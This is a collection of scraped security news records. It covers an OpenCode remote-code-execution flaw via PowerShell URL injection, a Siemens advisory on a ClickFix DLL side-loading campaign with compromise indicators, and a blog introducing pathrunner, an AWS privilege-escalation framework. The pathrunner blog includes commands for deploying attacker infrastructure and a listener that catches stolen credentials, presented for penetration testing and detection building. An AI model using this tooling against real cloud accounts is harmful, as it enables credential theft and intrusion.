Pillar Security researchers said Anomaly patched the vulnerability on September 28 in version 1.18.33 – without a CVE or security advisory. “As a result, conventional vulnerability scanners and dependency alerts will not identify affected installations, potentially leaving enterprises unaware that they need to upgrade,” Pillar Security researchers warned.

URL Validation Falls Short of Preventing OpenCode RCE Attacks

Pillar Security researchers claimed that the standard fix isn’t enough to fully remediate this vulnerability, which they assessed should be allocated a critical severity rating (CVSS) of 9.8.

According to the researchers, URL scheme validation alone cannot prevent the attack because the malicious payload can be embedded in a seemingly legitimate HTTPS URL.

On Windows, the vulnerable open dependency passed the URL to PowerShell without properly escaping it, allowing the shell to interpret part of the URL as a command.

Although OpenCode added URL scheme checks in version 1.18.33, the researchers said the crucial fix was to update the dependency to a version that correctly quotes the URL, preventing PowerShell from interpreting the payload as executable code.

They recommend that developers avoid passing untrusted URLs through shell commands altogether, instead using argument-based process execution to reduce the risk of command injection.

OpenCode RCE Flaw Unrelated to Recent Console Security Breach

This vulnerability report comes a few days after OpenCode confirmed a security breach affecting its Console, which allows teams to share access to AI models through centrally managed API credentials.

Speaking to Infosecurity, Pillar Security’s Cohen stressed that this newly disclosed vulnerability was not related to the Console breach.

“The breach hit a legacy system behind a hosted key proxy, and exposed provider keys users had stored there. The vulnerability we reported runs the other way: a malicious remote MCP server executing code on a developer's own machine during the OAuth handshake. Different target and attacker position,” he explained.

Nevertheless, Cohen highlighted that both incidents come down to the same thing, “Who you let hand credentials and inputs to an AI coding tool, and what that tool does with them.”

articles.title: Siemens Customers Targeted by ClickFix Attackers Exploiting DLL Side-Loading Flaw
articles.context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
articles.full_text:
Siemens has warned customers that attackers are actively exploiting a dynamic link library (DLL) side-loading vulnerability in its Software Center to distribute malware.

The company has attributed the activity to the Romulus multi-platform ClickFix campaign.

Romulus is a server hosting panel that was identified by Forescout researchers on October 14. The panel allows cybercriminals to deploy ClickFix tactics into an entire ecosystem which can be repeatedly used to deliver multiple forms of malware to victims.

ClickFix is a popular attack technique among cybercriminals. It relies on social engineering to trick the victim into running attacker-supplied commands on their own machine.

The Siemens blog, published on October 19, detailed how attackers are targeting CVE-2026-110936 (CVSS 8.4) to load malicious DLL files into a directory that the Siemens Software Center searches for. They use a genuine copy of the application with a valid signature and place their own files next to it.

The attackers then attempt to distribute these files to customers by using a ClickFix lure.

Version 3.5.8.7 of Software Center loaded helper files from its own folder without checking them, the firm admitted.

If a user follows the ClickFix commands, malicious code will execute on the device with the privileges of the affected application.

“Never paste a command from a web page into Win+R, the Run box or PowerShell. A real ‘I am not a robot’ check never asks for this,” Siemens wrote.

How to Defend Against the Romulus Campaign

Siemens urged Software Center customers update to version 4.0.9.8, which contains a fix for the flaw. Existing installations update automatically the next time they start.

Customers should also look out for the following indications that their PC is affected by the campaign:

"Siemens Software Center" in the start-up apps or Task Scheduler of a PC that never had it installed

A folder called SM Software Provisioning Service inside AppData\Local\Programs is created by the malware

Files named activate.bak or statinfosta.DB next to SiemensSoftwareCenter.exe

A folder called FTSuite containing a file ftc.uml inside AppData\Local

Network connections to 96.62.218[.]59

If a PC has been found to be compromised, customers should isolate the device, stop the process first, then remove the start-up entry and task and reset passwords.

Siemens added that detection tools should focus on the folder and suspicious behavior, not on the Siemens file fingerprint as the file itself is genuine.

Customers should also ensure that they only download Siemens software from official Siemens sources and block the active IP address and domain listed in the advisory.

Image credit: Kittyfly / Shutterstock.com

Introducing pathrunner: An AWS privilege escalation framework
articles.context: If your detections only support a specific post exploitation action, like creating a new administrative user and granting administrator access to it, you will be blind when an...
articles.full_text:
In December 2025, we released pathfinding.cloud, a catalog of AWS IAM privilege escalation techniques. Pathfinding.cloud defines the sets of permissions that would allow an AWS IAM principal to gain access to another AWS IAM principal. In May 2026, we released Pathfinding Labs, a collection of intentionally vulnerable AWS environments that can be deployed into a sandbox account, exploited, and torn down. You can use these labs to learn how the techniques documented in pathfinding.cloud are exploited.

Today, we're releasing pathrunner, a modular, cloud-native offensive security framework designed to help automate the exploitation of the paths defined in pathfinding.cloud and instantiated in Pathfinding Labs.

Full documentation for pathrunner and all of its commands and exploit modules can be found at https://pathfinding.cloud/pathrunner/.

Why build an offensive tool?

Every defender has more security vulnerabilities and misconfigurations on their plate than they have time to resolve, which means they must triage and carefully choose where they spend their finite remediation time. An offensive tool demonstrates the impact of an attack, enabling defenders to prioritize exploitable misconfigurations based on how impactful they are.

When assessing software vulnerabilities, we look for publicly accessible Proof of Concept (PoCs) exploits. If those exist, we increase the severity of related findings. When it comes to misconfigurations, exploitability can be more difficult to determine. For example, what's an exploitable misconfiguration vs. simply a missing best practice?

Offensive security approaches can pinpoint the specific misconfigurations that are exploitable and show exactly how they can be exploited in your environment. Defenders and offensive security teams alike both widely use offensive security tools like Metasploit and Bloodhound. There is nothing quite like seeing a vulnerability or misconfiguration in your environment actually exploited!

Pathrunner in action

The best way to understand what pathrunner can do is to watch it in action. In the following clip, we'll walk through the following actions:

Importing the credentials for an AWS IAM user identity that we've gained access to

Selecting an exploit module that our victim identity has permission to execute

Selecting the target identity that we want to access

Executing the attack and capturing the credentials of the target identity

Automatically importing the new credentials and switching to them

Validating that we have successfully accessed the target identity

Your browser does not support the video tag.

Identities are the sessions of the cloud

In traditional on-prem Active Directory environments, when attackers compromise a workload, the best and most likely path to the next hop in the attack path is usually through another workload, which is often a server or user workstation. Each connection between a workload and the attacker is called a session, because it is usually a TCP session between the two hosts. Not all escalations pivot through workloads, of course (e.g., kerberosting), but "attacker to workload" sessions are certainly very common in traditional Active Directory environments.

In cloud environments, the script is flipped. There are still occasional times where an attack hops from one workload to another and sends network sessions back to the attacker's command and control servers, but more often than not, penetration testers and real attacks are hopping from one cloud identity to another by accessing credentials. Sometimes this happens by executing code on a remote workload, and sometimes no workload is involved at all.

For these reasons, identities are fundamental to pathrunner. The very first pathrunner feature we created was the ability to import identities from multiple text-based formats by using a simple command: pathrunner identity add --from-clipboard. The second feature was the corresponding pathrunner identity switch [name] command, which enables you to easily switch between multiple identities.

Here's a look at two configured identities in pathrunner. The identity named bedrock-001 is associated with the initial set of credentials, which we first gain access to as the "attacker." The identity named bedrock_codeinterpreter_1790097483 is associated with the post-exploitation identity that we gain access to after running the bedrock-001 exploit in pathrunner.

Modular by design

Pathrunner's modular design was heavily influenced by a few successful exploitation frameworks of years past, like Metasploit, CrackMapExec (now NetExec), and Empire (now forked and maintained here). And even in the AWS cloud realm, we have Pacu and Nebula. These modular tools allow the operator to exploit multiple misconfigurations or vulnerabilities within the same user interface, which makes them much easier to use.

As of October 2026, there are over 80 exploit modules in pathrunner.

Modular payloads make for better detections

Another foundational decision that we made when building pathrunner was to support modular payloads. For an offensive security practitioner, sometimes certain payloads just don't work. Maybe there are network access restrictions or organizational service control policies in place. Providing multiple payloads for each module lets the user pick the payload that makes the most sense.

Another key benefit of having multiple payloads in an offensive security tool is that it allows you to build and evaluate more detections. If your detections only support a specific post exploitation action, like creating a new administrative user and granting administrator access to it, you will be blind when an attacker goes in another direction. Instead, if you walk through each and every pathrunner payload in your environment and build detections for each of them, you will have a much greater chance of catching malicious activity.

Use pathrunner to manage your "attacker" infrastructure

In cloud compromises, it is a common practice for attackers to stage their payload or exploit artifacts on external sources or to exfiltrate data or credentials to those external sources. They often use additional compromised cloud accounts to host their infrastructure.

Offensive security practitioners often use additional cloud accounts that they own to replicate this pattern. Done manually, this can be a tedious task. In pathrunner, we built this functionality in! We included support for adding an "attacker" identity and the ability to deploy "attacker" infrastructure in an AWS account that you control, separate from any "victim" AWS accounts.

In practice, if you configure your attacker identity with pathrunner attacker identity add and then type attacker infra ec2 create, pathrunner will create an EC2 instance in your own "attacker" account, deploy a second instance of pathrunner on that instance, put the right security groups in place, and show you how to connect to it via SSH or SSM.

Once you connect, you can then start a remote listener on the publicly accessible EC2 instance by using attacker listener start and start collecting credentials. In other words, with pathrunner, you can set up a remote endpoint to catch credentials with just three commands.

Here's the end-to-end flow showing how it all works. In the video, pay attention to the iTerm2 tabs at the top. I'll switch between MY MAC and ATTACKER AWS when showing how I can run an exploit from MY MAC, but catch the credentials on the "attacker" infra instance of pathrunner.

Your browser does not support the video tag.

Alternatively, if you initially run pathrunner on a remotely accessible host that already has some public callback ports open, you can skip all of the remote deployment steps and just start the listener with attacker listener start. That's it!

Be a team player: Give your blue team an audit log

As mentioned earlier, it is quite impactful to show a defender exactly how you were able to exploit a misconfiguration in their environment. It's even more helpful to show exactly what audit log events your activity generated, along with timestamps for when those events occurred. We have good news! Pathrunner has this functionality built in as well. If you type workspace report --output pathrunner.html, you will get a report that is ready to hand over to the defenders.

There are two main parts to this report. First, it shows you the resources that were created or modified during your use of pathrunner. You can manually clean these up when you are done, or you can use the workspace cleanup all sub-command.

Second, the report includes a table that lists all of the CloudTrail events that we think pathrunner would have triggered, along with timestamps and descriptions.

What's Next?

We hope that pathrunner helps you improve your cloud detection capabilities, as well as the overall security posture of your environment. Please head over to the pathrunner repo if you would like to suggest features, let us know about bugs, or contribute to the project, and don't forget about the complete command reference guide at https://pathfinding.cloud/pathrunner/.
